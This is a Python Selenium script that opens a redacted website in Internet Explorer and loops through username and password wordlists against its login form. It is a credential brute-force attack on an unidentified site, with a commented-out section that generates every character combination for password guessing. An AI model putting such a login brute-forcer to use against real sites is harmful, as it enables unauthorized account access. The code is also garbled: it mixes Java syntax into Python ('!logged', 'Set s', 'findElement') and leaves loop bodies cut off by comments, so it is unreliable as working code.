from selenium import webdriver
import time

def main():
    browser = webdriver.Ie("C:\\Users\\Mga\\Downloads\\IEDriverServer_Win32_2.42.0\\IEDriverServer.exe")
    website = 'WEBSITE_URL_DELETED_FOR_CONFIDENTIALITY'
    browser.get(website)
    time.sleep(2)
    browser.SwitchTo().Window(browser.Last())
    browser.findElement(By.xpath("")).click();
    Set s = browser.getWindowHandles();
    for i in range(len(browser)):
        print("title: " + str(browser.title))
        elem = browser.find_element_by_tag_name("title")
        print(elem.get_attribute("value"))
        
    browser.switch_to_window(browser.window_handles[1]) #switch_to_window(browser.window_handles.Last())
    logged = False

    try:
        uName = browser.find_element_by_name('username')
        pWord = browser.find_element_by_name('password')
        uName.send_keys("abc")
        pWord.send_keys("1234567890")
    except:
        print("fail")
        
    userNameList = [line.rstrip('\n') for line in open('usernames.txt')]
    passwordList = [line.rstrip('\n') for line in open('passlist.txt', encoding='latin-1')]

    while !logged:
        for i in range(len(userNameList)) and !logged:
            currName = userNameList[i]
            try:
                uName = browser.find_element_by_name('username')
                for j in range(len(passwordList)) and !logged:
                    try:
                        pWord = browser.find_element_by_name('password')
                        currPassword = passwordList[j]
                        uName.send_keys(currName)
##                        pWord.send_keys(currPassword)
##                        pWord.submit()
##                    except:
##                        print('Already Logged In')
##                        logged = True
##                        break
##            except:
##                print('Already Logged In')
##                logged = True
##                break
##        time.sleep(5)


if __name__ == "__main__":
    main()


# needs work. this section is for making a comprehensive list. gets memory error.
##    import itertools
##    completeList = []
##    for i in range(5,6):
##        temp = itertools.product('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()_+-=`~,./;[]\<>?:"{}|',
##                                         repeat=i) # i is the length of your result.
##        for j in temp:
##            #print(''.join(j))
##            completeList.append(''.join(j))
####            for q in range(len(completeList)):
####                print(completeList[q])
##        print(completeList)
####    for i in range(len(completeList)):
####        print(completeList[i])
